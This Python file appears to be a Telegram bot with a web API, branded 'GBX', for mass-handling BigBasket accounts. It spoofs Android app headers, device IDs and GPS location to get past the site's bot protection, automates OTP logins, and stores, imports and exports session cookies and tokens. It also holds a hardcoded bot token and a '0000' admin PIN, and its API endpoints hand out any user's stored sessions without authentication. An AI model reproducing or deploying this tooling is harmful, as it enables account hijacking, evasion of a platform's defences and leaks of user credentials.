import os
import logging
import random
import re
import time
import asyncio
import urllib.parse
import secrets
import base64
import json
import qrcode
import io
from typing import Dict, Optional
import requests
import firebase_admin
from firebase_admin import credentials, db as rtdb
from fastapi import FastAPI, Request, Response
from fastapi.responses import JSONResponse, HTMLResponse
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, ReplyKeyboardRemove, BotCommand
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram.error import TelegramError

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# --- FIREBASE REALTIME DATABASE SETUP ---
firebase_config_json = os.environ.get("FIREBASE_CREDENTIALS_JSON")

if firebase_config_json:
    try:
        cred_dict = json.loads(firebase_config_json)
        cred = credentials.Certificate(cred_dict)
        firebase_admin.initialize_app(cred, {
            'databaseURL': 'https://gbx-x-bb-default-rtdb.firebaseio.com/'
        })
        logging.info("Firebase initialized successfully from Environment Variable!")
    except Exception as e:
        logging.error(f"Firebase Env Init Error: {e}")
else:
    try:
        cred = credentials.Certificate("serviceAccountKey.json")
        firebase_admin.initialize_app(cred, {
            'databaseURL': 'https://gbx-x-bb-default-rtdb.firebaseio.com/'
        })
        logging.info("Firebase initialized using local serviceAccountKey.json")
    except Exception as e:
        logging.error(f"Firebase local init error: {e}")

# --- ENHANCED DEVICE SPOOFING & HEADERS ---
def _get_mock_location():
    lat = 23.385085 + random.uniform(-0.002000, 0.002000)
    lng = 85.286066 + random.uniform(-0.002000, 0.002000)
    return str(lat), str(lng)

def _random_device_id() -> str:
    return secrets.token_hex(8)

def _build_app_headers() -> dict:
    lat, lng = _get_mock_location()
    return {
        "Host": "www.bigbasket.com",
        "user-agent": "Bigbasket-Android/8.35.0 (Android/14; Vivo I2017)",
        "content-type": "application/json; charset=utf-8",
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate",
        "x-requested-with": "in.bigbasket.android",
        "client-id": "android",
        "platform": "Bigbasket-Android",
        "version-code": "1590",
        "app-version": "8.35.0",
        "os-version": "14",
        "manufacturer": "VIVO",
        "model-name": "I2017",
        "swuid": _random_device_id(),
        "deviceid": _random_device_id(),
        "latitude": lat,
        "longitude": lng,
        "connection": "keep-alive",
        "referer": "https://www.bigbasket.com/"
    }

def _build_headers(session: Dict) -> Dict[str, str]:
    h = {
        "user-agent": "Mozilla/5.0 (Linux; Android 14; I2017 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.5845.163 Mobile Safari/537.36",
        "content-type": "application/json",
        "client-id": "portal",
        "platform": "Bigbasket-Android",
        "x-requested-with": "in.bigbasket.android",
    }
    if session.get("tid"): h["tid"] = session["tid"]
    if session.get("token"): h["token"] = session["token"]
    if session.get("x-oztok"): h["x-oztok"] = session["x-oztok"]
    if session.get("sid"): h["sid"] = session["sid"]
    return h

def fetch_bb_profile(session_data: dict) -> dict:
    url = "https://www.bigbasket.com/ui-svc/v1/member/details"
    headers = _build_headers(session_data)
    try:
        cookies = session_data.get("cookies", {})
        res = requests.get(url, headers=headers, cookies=cookies, timeout=10)
        if res.status_code == 200:
            data = res.json()
            member = data.get("member", data.get("data", {}))
            name = member.get("name", member.get("first_name", "BigBasket User"))
            phone = member.get("mobile", member.get("phone", ""))
            return {"name": name, "phone": phone}
    except Exception as e:
        logging.error(f"Profile fetch error: {e}")
    return {"name": "BigBasket User", "phone": session_data.get("phone", "N/A")}

def bb_send_otp(phone: str):
    url = "https://www.bigbasket.com/member-tdl/v3/member/otp/"
    headers = _build_app_headers()
    payload = {"mobile": phone, "tag": "login"}
    try:
        session = requests.Session()
        res = session.post(url, headers=headers, json=payload, timeout=15)
        if not res.text.strip():
            return {"status": "fail", "message": f"Blocked by Cloudflare/WAF (Status: {res.status_code})"}
        return res.json()
    except Exception as e:
        return {"status": "fail", "message": str(e)}

def bb_verify_otp(phone: str, otp: str):
    url = "https://www.bigbasket.com/member-tdl/v3/member/unified-login/"
    headers = _build_app_headers()
    payload = {"mobile": phone, "otp": otp, "tag": "login"}
    try:
        session = requests.Session()
        res = session.post(url, headers=headers, json=payload, timeout=15)
        return res.json(), res.cookies.get_dict()
    except Exception as e:
        return {"status": "fail"}, {}

# --- USER & COUPON HELPERS ---
def get_user_data(user_id: int):
    try:
        ref = rtdb.reference(f'users/{user_id}')
        data = ref.get()
        if data:
            return float(data.get('balance', 5.0)), int(data.get('referral_count', 0))
        return 5.0, 0
    except Exception as e:
        return 5.0, 0

def update_balance(user_id: int, amount: float):
    try:
        ref = rtdb.reference(f'users/{user_id}')
        data = ref.get() or {'balance': 5.0, 'referral_count': 0}
        new_bal = float(data.get('balance', 5.0)) + amount
        ref.update({'balance': new_bal})
    except Exception as e:
        pass

def is_user_banned(user_id: int) -> bool:
    try:
        return rtdb.reference(f'banned_users/{user_id}').get() is not None
    except Exception:
        return False

def is_utr_used(utr: str) -> bool:
    try:
        return rtdb.reference(f'used_utrs/{str(utr).strip()}').get() is not None
    except Exception:
        return False

def add_used_utr(utr: str):
    try:
        rtdb.reference(f'used_utrs/{str(utr).strip()}').set(True)
    except Exception:
        pass

def increment_tx_count(user_id: int) -> int:
    try:
        ref = rtdb.reference(f'users/{user_id}/tx_count')
        count = ref.get() or 0
        count += 1
        ref.set(count)
        return count
    except Exception:
        return 1

ADMIN_CHAT_ID = int(os.getenv("ADMIN_CHAT_ID", 8053042225))
BOT_TOKEN = "8791725918:AAEfdb0NlL7LFMYXzwD0LNjfZaWilJu_-Bk"

REQUIRED_TARGETS = [-1003332858806, -1003630519339, -1003197501531, -1003862251237]
TARGET_LINKS = {
    -1003332858806: "https://t.me/+6ByfGDRBKgsxMjZl",   
    -1003630519339: "https://t.me/+OWrCoeF-JutmNjg1",   
    -1003197501531: "https://t.me/+f2mWfDs6EUIxYTBl",   
    -1003862251237: "https://t.me/+O_-kEF2f5f1kMjdl"            
}
TARGET_LABELS = {
    -1003332858806: "📢 GBX LOOT", 
    -1003630519339: "📢 GBX EARN",
    -1003197501531: "📢 GBX ZONE", 
    -1003862251237: "💬 Join Group Chat (GC)"
}

USER_STATES = {}
ADMIN_COUPON_STEPS = {}
PENDING_TX = {}
YOUR_UPI_ID = "BHARATPE.8R0I1G1N4X31943@fbpe" 
MERCHANT_NAME = "GBX"
bot_app = None

def load_dashboard_menu():
    return ReplyKeyboardMarkup([
        [KeyboardButton("💰 Balance"), KeyboardButton("🛠️ Customer Care")],
        [KeyboardButton("🌐 Web Panel")]
    ], resize_keyboard=True)

async def get_remaining_channels(user_id: int):
    global bot_app
    remaining = []
    if not bot_app:
        return REQUIRED_TARGETS
    for target in REQUIRED_TARGETS:
        try:
            member = await bot_app.bot.get_chat_member(chat_id=target, user_id=user_id)
            if member.status in ['left', 'kicked', 'restricted']:
                remaining.append(target)
        except TelegramError:
            remaining.append(target)
    return remaining

async def show_force_join_menu(update: Update, remaining: list):
    buttons = []
    for target in remaining:
        buttons.append([InlineKeyboardButton(text=TARGET_LABELS[target], url=TARGET_LINKS[target])])
    buttons.append([InlineKeyboardButton(text="🔄 Verify / Check Access", callback_data="verify_all_joins")])
    total_left = len(remaining)
    await update.message.reply_text(f"⚠️ **Access Denied!**\n\nAbhi bhi `{total_left}` channels join karna baki hai:", reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown")
    await update.message.reply_text("🔒 *Dashboard locked!*", reply_markup=ReplyKeyboardRemove())

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_user_banned(user_id):
        await update.message.reply_text("❌ Your account is banned from using this bot.")
        return

    args = context.args
    try:
        user_ref = rtdb.reference(f'users/{user_id}')
        user_data = user_ref.get()
        if not user_data:
            user_ref.set({'balance': 5.0, 'referral_count': 0, 'tx_count': 0, 'username': update.effective_user.username or "N/A"})
            if args and args[0].isdigit():
                referrer_id = int(args[0])
                if referrer_id != user_id:
                    ref_check = rtdb.reference(f'referrals/{user_id}').get()
                    if not ref_check:
                        referrer_ref = rtdb.reference(f'users/{referrer_id}')
                        if referrer_ref.get():
                            rtdb.reference(f'referrals/{user_id}').set(referrer_id)
                            curr_refs = int(referrer_ref.get().get('referral_count', 0)) + 1
                            curr_bal = float(referrer_ref.get().get('balance', 5.0)) + 2.0
                            referrer_ref.update({'balance': curr_bal, 'referral_count': curr_refs})
                            if bot_app:
                                try:
                                    await bot_app.bot.send_message(referrer_id, f"🎉 **New Referral!** ₹2 added to your balance!", parse_mode="Markdown")
                                except Exception:
                                    pass
    except Exception as e:
        logging.error(f"Start error: {e}")

    remaining = await get_remaining_channels(user_id)
    if len(remaining) > 0:
        await show_force_join_menu(update, remaining)
        return
    await update.message.reply_text("✨ **Dashboard Active!**\n🎁 Sign-up Bonus of ₹5 added to your balance!", reply_markup=load_dashboard_menu(), parse_mode="Markdown")

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_CHAT_ID:
        await update.message.reply_text("⚠️ Yeh command sirf admin ke liye hai!")
        return

    admin_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Broadcast", callback_data="adm_menu_broadcast")],
        [InlineKeyboardButton("👥 User List", callback_data="adm_menu_userlist"), InlineKeyboardButton("🚫 Ban ID", callback_data="adm_menu_ban")],
        [InlineKeyboardButton("✅ Unban ID", callback_data="adm_menu_unban")],
        [InlineKeyboardButton("🎟️ Bot Coupon Generator", callback_data="adm_gen_coupon")]
    ])
    await update.message.reply_text("🛠️ **Admin Control Panel:**", reply_markup=admin_markup, parse_mode="Markdown")

async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_user_banned(user_id):
        return

    user_text = update.message.text
    if not user_text:
        return

    remaining = await get_remaining_channels(user_id)
    if len(remaining) > 0:
        USER_STATES[user_id] = None
        await show_force_join_menu(update, remaining)
        return

    if user_text in ["💰 Balance", "🛠️ Customer Care", "🌐 Web Panel"]:
        USER_STATES[user_id] = None

    state = USER_STATES.get(user_id)

    # --- ADMIN COUPON GENERATOR FLOW ---
    if user_id == ADMIN_CHAT_ID and user_id in ADMIN_COUPON_STEPS:
        step_data = ADMIN_COUPON_STEPS[user_id]
        step = step_data.get("step")

        if step == "AMOUNT":
            try:
                amount = float(user_text)
                if amount <= 0:
                    raise ValueError
                step_data["amount"] = amount
                step_data["step"] = "CODE"
                await update.message.reply_text("🔤 **Ab 6-digit ka unique coupon code (text) type karke bhejein:**", parse_mode="Markdown")
                return
            except ValueError:
                await update.message.reply_text("❌ Kripya sahi numeric amount daalein.")
                return

        elif step == "CODE":
            code = user_text.strip()
            if len(code) != 6:
                await update.message.reply_text("⚠️ Coupon code exact 6 characters/digits ka hona chahiye. Dobara bhejein:")
                return
            
            # Check if coupon already exists
            if rtdb.reference(f'coupons/{code}').get() is not None:
                await update.message.reply_text("❌ Yeh coupon code pehle se exist karta hai. Doosra 6-digit code bhejein:")
                return

            step_data["code"] = code
            step_data["step"] = "PASSWORD"
            await update.message.reply_text("🔐 **Kripya security ke liye 4-digit PIN/Password enter karein :**", parse_mode="Markdown")
            return

        elif step == "PASSWORD":
            pin = user_text.strip()
            if pin != "0000":
                await update.message.reply_text("❌ Galat password! Coupon generation cancel ho gaya. Dobara admin panel se try karein.")
                ADMIN_COUPON_STEPS.pop(user_id, None)
                return

            amount = step_data["amount"]
            code = step_data["code"]
            
            # Save coupon to Firebase
            rtdb.reference(f'coupons/{code}').set({
                'amount': amount,
                'used': False,
                'used_by': None
            })

            ADMIN_COUPON_STEPS.pop(user_id, None)
            await update.message.reply_text(
                f"✅ **Coupon Successfully Generated!**\n\n"
                f"🎟️ Code: `{code}`\n"
                f"💰 Amount: `₹{amount}`\n"
                f"🔒 Status: Active (One-time use)",
                parse_mode="Markdown"
            )
            return

    # --- USER COUPON CLAIM FLOW ---
    if state == "CLAIMING_COUPON":
        code = user_text.strip()
        USER_STATES[user_id] = None

        coupon_ref = rtdb.reference(f'coupons/{code}')
        coupon_data = coupon_ref.get()

        if not coupon_data:
            await update.message.reply_text("❌ **Invalid Coupon Code!** Aisa koi coupon exist nahi karta.")
            return

        if coupon_data.get('used', False):
            await update.message.reply_text("❌ **Coupon Already Used!** Yeh coupon pehle hi redeem kiya ja chuka hai.")
            return

        amount = float(coupon_data.get('amount', 0))

        # Mark coupon as used and tie it permanently to this user
        coupon_ref.update({
            'used': True,
            'used_by': user_id
        })

        # Add balance to user
        update_balance(user_id, amount)

        await update.message.reply_text(
            f"🎉 **Coupon Successfully Claimed!**\n\n"
            f"💰 `₹{amount}` has been added to your balance permanently.",
            parse_mode="Markdown"
        )
        return

    if state == "AWAITING_AMOUNT":
        try:
            amount = float(user_text)
            if amount < 10.0:
                await update.message.reply_text("❌ Min ₹10 required.")
                return
            USER_STATES[user_id] = None
            tx_ref = f"GBX{user_id}X{random.randint(1000, 9999)}"
            PENDING_TX[user_id] = {"amount": amount, "tx_ref": tx_ref}
            
            raw_upi_string = f"upi://pay?pa={YOUR_UPI_ID}&pn={MERCHANT_NAME}&am={amount:.2f}&cu=INR&tr={tx_ref}"
            qr = qrcode.QRCode(version=1, box_size=10, border=4)
            qr.add_data(raw_upi_string)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            
            bio = io.BytesIO()
            bio.name = "qr.png"
            img.save(bio, "PNG")
            bio.seek(0)
            
            verify_btn = InlineKeyboardMarkup([[InlineKeyboardButton(text="🔄 Verify Payment (Enter UTR)", callback_data=f"ask_utr:{amount}")]])
            await update.message.reply_photo(photo=bio, caption=f"📲 Pay ₹{amount:.2f}\n⚠️ *Payment karke niche button par UTR daalein.*", reply_markup=verify_btn)
            return
        except ValueError:
            await update.message.reply_text("❌ Numeric amount daalein.")
            return

    elif state == "AWAITING_UTR" or re.match(r"^\d{12}$", user_text.strip()):
        utr = user_text.strip()
        if not re.match(r"^\d{12}$", utr):
            await update.message.reply_text("❌ Kripya sahi 12-digit ka UTR number bhejein.")
            return
        if is_utr_used(utr):
            await update.message.reply_text("❌ This UTR is already used!")
            return
            
        tx_data = PENDING_TX.get(user_id)
        amount = tx_data["amount"] if tx_data else 10.0
        USER_STATES[user_id] = None
        tx_count = increment_tx_count(user_id)
        
        user_name = update.effective_user.full_name or update.effective_user.username or "N/A"
        
        if bot_app:
            admin_msg = (
                f"📥 **Payment Request**\n"
                f"👤 User ID: `{user_id}`\n"
                f"📛 User Name: `{user_name}`\n"
                f"🔢 UTR: `{utr}`\n"
                f"🆔 TX ID Count: `{tx_count}`\n"
                f"💰 Amount: ₹{amount}"
            )
            await bot_app.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=admin_msg,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("✅ Accept", callback_data=f"adm_accept:{user_id}:{amount}:{utr}"),
                    InlineKeyboardButton("❌ Reject", callback_data=f"adm_reject:{user_id}:{utr}")
                ]]),
                parse_mode="Markdown"
            )
            await update.message.reply_text("⏳ **Payment Verification Pending!**")
        return

    if user_text == "💰 Balance":
        current_bal, total_refs = get_user_data(user_id)
        bot_username = context.bot.username if context.bot else "gbx_x_bb_bot"
        ref_link = f"https://t.me/{bot_username}?start={user_id}"
        
        balance_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("🎁 Claim Amount via Coupon", callback_data="user_claim_coupon")]
        ])

        balance_text = (
            f"💳 **Your Balance:** `₹{current_bal:.2f}`\n\n"
            f"👥 **Total Referrals:** `{total_refs}`\n"
            f"🔗 **Referral Link:**\n`{ref_link}`\n\n"
            f"📥 **Enter amount to deposit (Min ₹10):**"
        )
        USER_STATES[user_id] = "AWAITING_AMOUNT"
        await update.message.reply_text(balance_text, reply_markup=balance_markup, parse_mode="Markdown")

    elif user_text == "🛠️ Customer Care":
        support_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("💬 Open Support Mini Web", url="https://t.me/gbx_support_bot")]])
        await update.message.reply_text("🛠️ Click below to open Customer Care / Support:", reply_markup=support_keyboard)

    elif user_text == "🌐 Web Panel":
        panel_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("🌐 Open Web Panel", web_app=WebAppInfo(url="https://www.bigbasket.com"))]
        ])
        msg = await update.message.reply_text(
            "🎛️ **HTML Web Panel Access:**\n\nClick the button below to open your Mini Web Panel.\n⚠️ *This panel will auto-delete in 60 seconds.*",
            reply_markup=panel_markup,
            parse_mode="Markdown"
        )
        async def delete_after_60(message_obj):
            await asyncio.sleep(60)
            try:
                await message_obj.delete()
            except Exception:
                pass
        asyncio.create_task(delete_after_60(msg))
    else:
        await update.message.reply_text("✨ **Dashboard Active!**", reply_markup=load_dashboard_menu())

async def admin_action_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bot_app
    query = update.callback_query
    if query:
        await query.answer()
        data = query.data.split(":")
        action = data[0]
        
        if action == "adm_gen_coupon":
            user_id = query.from_user.id
            if user_id != ADMIN_CHAT_ID:
                return
            ADMIN_COUPON_STEPS[user_id] = {"step": "AMOUNT"}
            await query.message.reply_text("🎟️ **Coupon Generator Started**\n\nKripya coupon ka amount enter karein (₹ mein):", parse_mode="Markdown")
        
        elif action == "user_claim_coupon":
            user_id = query.from_user.id
            USER_STATES[user_id] = "CLAIMING_COUPON"
            await query.message.reply_text("🎁 **Apna 6-digit coupon code yahan type karke bhejein:**", parse_mode="Markdown")

        elif action == "adm_accept":
            target_user = int(data[1])
            amount = float(data[2])
            utr = data[3] if len(data) > 3 else "N/A"
            if utr != "N/A":
                add_used_utr(utr)
            update_balance(target_user, amount)
            await query.message.edit_text(f"✅ Approved! ₹{amount} added to User `{target_user}`.")
            if bot_app:
                try:
                    await bot_app.bot.send_message(target_user, f"🎉 **Payment Verified!** ₹{amount} added to your balance.", parse_mode="Markdown")
                except Exception:
                    pass
        elif action == "adm_reject":
            target_user = int(data[1])
            await query.message.edit_text(f"❌ Rejected payment request for User `{target_user}`.")
            if bot_app:
                try:
                    await bot_app.bot.send_message(target_user, "⌛ **Payment Rejected!** Invalid UTR or details.", parse_mode="Markdown")
                except Exception:
                    pass

async def prompt_utr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    USER_STATES[user_id] = "AWAITING_UTR"
    try:
        await query.message.delete()
    except Exception:
        pass
    await query.message.reply_text("📝 **Ab 12-digit ka UTR Number type karke bhejein:**", parse_mode="Markdown")

# --- FASTAPI SERVER & ENDPOINTS ---
api_app = FastAPI()

@api_app.get("/", response_class=HTMLResponse)
def serve_index():
    if os.path.exists("index.html"):
        with open("index.html", "r", encoding="utf-8") as f:
            return f.read()
    return "<h3>index.html not found!</h3>"

@api_app.get("/api/user-accounts")
def api_user_accounts(user_id: int):
    try:
        accs = rtdb.reference(f'accounts/{user_id}').get() or {}
        active_sess = rtdb.reference(f'active_session/{user_id}/id').get()
        accounts_list = []
        for acc_id, acc_val in accs.items():
            accounts_list.append({
                "id": acc_id,
                "phone": acc_val.get('phone', 'N/A'),
                "name": acc_val.get('name', 'BigBasket User'),
                "active": (acc_id == active_sess)
            })
        return {"accounts": accounts_list}
    except Exception as e:
        return {"accounts": [], "error": str(e)}

@api_app.get("/api/user-balance")
def api_user_balance(user_id: int):
    bal, _ = get_user_data(user_id)
    return {"balance": bal}

@api_app.get("/api/set-active-session")
def api_set_active_session(user_id: int, acc_id: str):
    try:
        acc_data = rtdb.reference(f'accounts/{user_id}/{acc_id}').get()
        if acc_data:
            acc_data['id'] = acc_id
            rtdb.reference(f'active_session/{user_id}').set(acc_data)
            return {"status": "success"}
    except Exception:
        pass
    return {"status": "fail"}

@api_app.get("/api/export-auth")
def api_export_auth(user_id: int, acc_id: str):
    try:
        acc_data = rtdb.reference(f'accounts/{user_id}/{acc_id}').get()
        if acc_data:
            return {"json_data": acc_data}
    except Exception:
        pass
    return {"json_data": None}

@api_app.get("/api/delete-account")
def api_delete_account(user_id: int, acc_id: str):
    try:
        rtdb.reference(f'accounts/{user_id}/{acc_id}').delete()
        active_sess = rtdb.reference(f'active_session/{user_id}/id').get()
        if active_sess == acc_id:
            rtdb.reference(f'active_session/{user_id}').delete()
        return {"status": "success"}
    except Exception:
        pass
    return {"status": "fail"}

@api_app.post("/api/send-otp")
async def api_send_otp(request: Request):
    data = await request.json()
    phone = data.get("phone")
    res = bb_send_otp(phone)
    if res.get("status") == "success" or "otp" in str(res).lower() or res.get("success") or res.get("key"):
        return {"success": True}
    return {"success": False, "message": res.get("message", "Failed to send OTP")}

@api_app.post("/api/verify-otp")
async def api_verify_otp(request: Request):
    data = await request.json()
    user_id = data.get("user_id")
    phone = data.get("phone")
    otp = data.get("otp")
    
    verify_res, cookies = bb_verify_otp(phone, otp)
    token = cookies.get("sessionid", cookies.get("token", f"bb_token_{secrets.token_hex(12)}"))
    tid = cookies.get("tid", f"bb_tid_{secrets.token_hex(16)}")
    
    temp_session = {'phone': phone, 'token': token, 'tid': tid, 'cookies': cookies}
    profile = fetch_bb_profile(temp_session)
    name = profile.get("name", "BigBasket User")
    
    acc_id = secrets.token_hex(4)
    session_data = {
        'phone': phone,
        'name': name,
        'token': token,
        'tid': tid,
        'cookies': cookies
    }
    rtdb.reference(f'accounts/{user_id}/{acc_id}').set(session_data)
    rtdb.reference(f'active_session/{user_id}').set({**session_data, 'id': acc_id})
    return {"success": True}

@api_app.post("/api/save-json")
async def api_save_json(request: Request):
    data = await request.json()
    user_id = data.get("user_id")
    json_data = data.get("json_data")
    
    profile = fetch_bb_profile(json_data)
    phone = profile.get("phone", json_data.get('phone', 'Imported'))
    name = profile.get("name", "BigBasket Account")
    
    acc_id = secrets.token_hex(4)
    session_payload = {
        'phone': phone,
        'name': name,
        'token': json_data.get('token', ''),
        'tid': json_data.get('tid', ''),
        'cookies': json_data.get('cookies', {})
    }
    rtdb.reference(f'accounts/{user_id}/{acc_id}').set(session_payload)
    rtdb.reference(f'active_session/{user_id}').set({**session_payload, 'id': acc_id})
    return {"success": True}

@api_app.on_event("startup")
async def startup_event():
    global bot_app
    TOKEN = BOT_TOKEN
    if TOKEN:
        try:
            bot_app = Application.builder().token(TOKEN).connect_timeout(30.0).read_timeout(30.0).updater(None).build()
            
            commands = [
                BotCommand("start", "Start the bot & open dashboard"),
                BotCommand("admin", "Admin Control Panel")
            ]
            await bot_app.bot.set_my_commands(commands)
            
            bot_app.add_handler(CommandHandler("start", start))
            bot_app.add_handler(CommandHandler("admin", admin_command))
            bot_app.add_handler(CallbackQueryHandler(prompt_utr, pattern="ask_utr:.*"))
            bot_app.add_handler(CallbackQueryHandler(admin_action_handler, pattern="adm_.*|user_claim_coupon"))
            bot_app.add_handler(MessageHandler(filters.ChatType.PRIVATE & filters.ALL & ~filters.COMMAND, handle_text_messages))
            
            await bot_app.initialize()
            await bot_app.start()
            logging.info("Main bot initialized successfully with full features.")
        except Exception as e:
            logging.error(f"Bot init error: {e}")

@api_app.post("/webhook")
async def receive_telegram_update(request: Request):
    global bot_app
    if bot_app:
        data = await request.json()
        await bot_app.process_update(Update.de_json(data, bot_app.bot))
    return Response(status_code=200)

if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(api_app, host="0.0.0.0", port=port)
